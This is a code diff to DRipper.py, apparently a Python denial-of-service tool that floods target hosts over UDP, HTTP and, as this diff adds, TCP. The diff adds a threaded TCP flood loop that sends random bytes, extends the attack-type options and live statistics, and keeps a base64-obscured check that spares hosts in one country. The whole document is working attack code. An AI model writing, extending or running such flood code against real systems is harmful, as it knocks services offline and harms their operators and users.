@@ -8,6 +8,11 @@ import string
 import signal
 import threading
 import subprocess
+import math
+from dataclasses import dataclass, field
+from datetime import datetime
+from optparse import OptionParser
+from os import urandom as randbytes
 import urllib.request
 from base64 import b64decode
 from datetime import datetime
@@ -31,7 +36,6 @@ def green_txt(*texts):
 def pink_txt(*texts):
     return color_txt('95', *texts)
 
-
 # Constants
 USAGE = 'Usage: python %prog [options] arg'
 EPILOG = 'Example: python DRipper.py -s 192.168.0.1 -p 80 -t 100'
@@ -48,13 +52,14 @@ class Context:
     """Class for passing a context to a parallel processes."""
     # Input params
     host: str = ''
-    original_host: str = ''
     port: int = 80
     threads: int = 100
     max_random_packet_len: int = 0
     random_packet_len: bool = False
     attack_method: str = None
+    
     protocol: str = 'http://'
+    original_host: str = ''
     url: str = None
 
     # Internal vars
@@ -68,6 +73,7 @@ class Context:
     packets_sent: int = 0
     connections_success: int = 0
     connections_success_prev: int = 0
+    packets_sent_prev: int = 0
     connections_failed: int = 0
     connections_check_time: int = 0
     errors: list[str] = field(default_factory=list)
@@ -105,8 +111,8 @@ def init_context(_ctx: Context, args):
 
 
 def readfile(filename: str):
-    """Read string from file."""
-    file = open(filename, "r")
+    """Read string from file"""
+    file = open(filename, 'r')
     content = file.readlines()
     file.close()
 
@@ -157,7 +163,7 @@ def down_it_udp(_ctx: Context):
             if GETTING_SERVER_IP_ERROR_MSG in _ctx.errors:
                 _ctx.errors.remove(GETTING_SERVER_IP_ERROR_MSG)
             _ctx.packets_sent += 1
-            # print('\033[92m Packet was sent \033[0;0m')
+            # print(green_txt('Packet was sent'))
         sock.close()
 
         if _ctx.port:
@@ -168,12 +174,7 @@ def down_it_udp(_ctx: Context):
                 thread.daemon = True
                 thread.start()
 
-        lock.acquire()
-        if not _ctx.show_statistics:
-            thread = threading.Thread(target=show_statistics, args=[_ctx])
-            thread.daemon = True
-            thread.start()
-        lock.release()
+        show_statistics(_ctx)
         time.sleep(.01)
 
 
@@ -192,11 +193,34 @@ def down_it_http(_ctx: Context):
             # print(green_txt('HTTP-Request was done')))
 
         _ctx.packets_sent += 1
+        show_statistics(_ctx)
+        time.sleep(.01)
 
-        if not _ctx.show_statistics:
-            _ctx.show_statistics = True
+
+def down_it_tcp(_ctx: Context):
+    """TCP flood."""
+    while True:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.SOL_TCP)
+            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            sock.settimeout(5)
+            sock.connect((_ctx.host, _ctx.port))
+            _ctx.connections_success += 1
+            while True:
+                try:
+                    bytes_to_send_len = _ctx.max_random_packet_len if _ctx.random_packet_len else 1024
+                    bytes_to_send = randbytes(_ctx.max_random_packet_len)
+                    sock.send(bytes_to_send)
+                    time.sleep(.01)
+                except:
+                    sock.close()
+                    break
+                else:
+                    _ctx.packets_sent += bytes_to_send_len
+                    show_statistics(_ctx)
+        except:
+            _ctx.connections_failed += 1
             show_statistics(_ctx)
-            _ctx.show_statistics = False
 
         time.sleep(.01)
 
@@ -293,7 +317,7 @@ def show_info(_ctx: Context):
     logo()
 
     my_ip_masked = get_first_ip_part(_ctx.start_ip)
-    is_random_packet_len = _ctx.attack_method == 'udp' and _ctx.random_packet_len
+    is_random_packet_len = _ctx.attack_method in ('tcp', 'udp') and _ctx.random_packet_len
 
     if len(_ctx.start_ip) > 0:
         your_ip = blue_txt(my_ip_masked)
@@ -323,41 +347,67 @@ def show_info(_ctx: Context):
 
 def show_statistics(_ctx: Context):
     """Prints statistics to console."""
-    _ctx.show_statistics = True
+    if not _ctx.show_statistics:
+        _ctx.show_statistics = True
 
-    lock.acquire()
-    if not _ctx.getting_ip:
-        t = threading.Thread(target=set_current_ip, args=[_ctx])
-        t.start()
-    lock.release()
+        lock.acquire()
+        if not _ctx.getting_ip:
+            t = threading.Thread(target=set_current_ip, args=[_ctx])
+            t.start()
+        lock.release()
 
-    check_successful_connections(_ctx)
-    # cpu_load = get_cpu_load()
+        if _ctx.attack_method == 'tcp':
+            check_successful_tcp_attack(_ctx)
+        else:
+            check_successful_connections(_ctx)
+        # cpu_load = get_cpu_load()
 
-    print("\033c")
-    show_info(_ctx)
+        print("\033c")
+        show_info(_ctx)
 
-    connections_success = green_txt(_ctx.connections_success)
-    connections_failed = red_txt(_ctx.connections_failed)
+        connections_success = green_txt(_ctx.connections_success)
+        connections_failed = red_txt(_ctx.connections_failed)
 
-    curr_time = datetime.now() - _ctx.start_time
+        curr_time = datetime.now() - _ctx.start_time
 
-    print(f'Duration:                   {str(curr_time).split(".", 2)[0]}')
-    # print(f'CPU Load Average:           {cpu_load}')
-    print(f'Packets Sent:               {_ctx.packets_sent}')
-    print(f'Connection Success:         {connections_success}')
-    print(f'Connection Failed:          {connections_failed}')
-    print('------------------------------------------------------')
+        print(f'Duration:                   {str(curr_time).split(".", 2)[0]}')
+        # print(f'CPU Load Average:           {cpu_load}')
+        if _ctx.attack_method == 'http':
+            print(f'Requests sent:              {_ctx.packets_sent}')
+        elif _ctx.attack_method == 'tcp':
+            size_sent = convert_size(_ctx.packets_sent)
+            if _ctx.packets_sent == 0:
+                size_sent = red_txt(size_sent)
+            else:
+                size_sent = blue_txt(size_sent)
 
-    if _ctx.errors:
-        print('\n\n')
-    for error in _ctx.errors:
-        print(red_txt(error))
-        print('\007')
+            print(f'Total Packets Sent Size:    {size_sent}')
+        else:  # udp
+            print(f'Packets Sent:               {_ctx.packets_sent}')
+        print(f'Connection Success:         {connections_success}')
+        print(f'Connection Failed:          {connections_failed}')
+        print('------------------------------------------------------')
 
-    sys.stdout.flush()
-    time.sleep(3)
-    _ctx.show_statistics = False
+        if _ctx.errors:
+            print('\n\n')
+        for error in _ctx.errors:
+            print(red_txt(error))
+            print('\007')
+
+        sys.stdout.flush()
+        time.sleep(3)
+        _ctx.show_statistics = False
+
+
+def convert_size(size_bytes: int) -> str:
+    """Converts size in bytes to human format."""
+    if size_bytes == 0:
+        return "0B"
+    size_name = ("B", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB")
+    i = int(math.floor(math.log(size_bytes, 1024)))
+    p = math.pow(1024, i)
+    s = round(size_bytes / p, 2)
+    return "%s %s" % (s, size_name[i])
 
 
 def get_cpu_load():
@@ -377,6 +427,8 @@ def create_thread_pool(_ctx: Context) -> list:
     for i in range(int(_ctx.threads)):
         if _ctx.attack_method == 'http':
             thread_pool.append(threading.Thread(target=down_it_http, args=[_ctx]))
+        elif _ctx.attack_method == 'tcp':
+            thread_pool.append(threading.Thread(target=down_it_tcp, args=[_ctx]))
         else:  # _ctx.attack_method == 'udp':
             thread_pool.append(threading.Thread(target=down_it_udp, args=[_ctx]))
 
@@ -427,6 +479,22 @@ def check_successful_connections(_ctx: Context):
                 _ctx.errors.append(NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG)
     else:
         _ctx.connections_check_time = curr_ms
+        _ctx.connections_success_prev = _ctx.connections_success
+        if NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG in _ctx.errors:
+            _ctx.errors.remove(NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG)
+
+
+def check_successful_tcp_attack(_ctx: Context):
+    """Checks if there are changes in sended bytes count."""
+    curr_ms = time.time_ns()
+    diff_sec = (curr_ms - _ctx.connections_check_time) / 1000000 / 1000
+    if _ctx.packets_sent == _ctx.packets_sent_prev:
+        if diff_sec > SUCCESSFUL_CONNECTIONS_CHECK_PERIOD_SEC:
+            if NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG not in _ctx.errors:
+                _ctx.errors.append(NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG)
+    else:
+        _ctx.connections_check_time = curr_ms
+        _ctx.packets_sent_prev = _ctx.packets_sent
         if NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG in _ctx.errors:
             _ctx.errors.remove(NO_SUCCESSFUL_CONNECTIONS_ERROR_MSG)
 
@@ -441,12 +509,12 @@ def validate_input(args):
         print(red_txt('Wrong threads number.'))
         return False
 
-    if args.attack_method not in ('udp', 'http'):
-        print(red_txt('Wrong attack type. Possible options: udp, http.'))
-        return False
-
     if not args.host:
         print(red_txt('Host wasn\'t detected'))
+        return False
+
+    if args.attack_method not in ('udp', 'tcp', 'http'):
+        print(red_txt('Wrong attack type. Possible options: udp, tcp, http.'))
         return False
 
     return True
@@ -464,6 +532,7 @@ def validate_context(_ctx: Context):
 def go_home(_ctx: Context):
     """Modifies host to match the rules"""
     home_code = b64decode('dWE=').decode('utf-8')
+    print(_ctx.host_ip, get_host_country(_ctx.host_ip))
     if _ctx.host.endswith('.'+home_code.lower()) or get_host_country(_ctx.host_ip) in (home_code.upper()):
         _ctx.host = 'localhost'
         _ctx.host_ip = 'localhost'
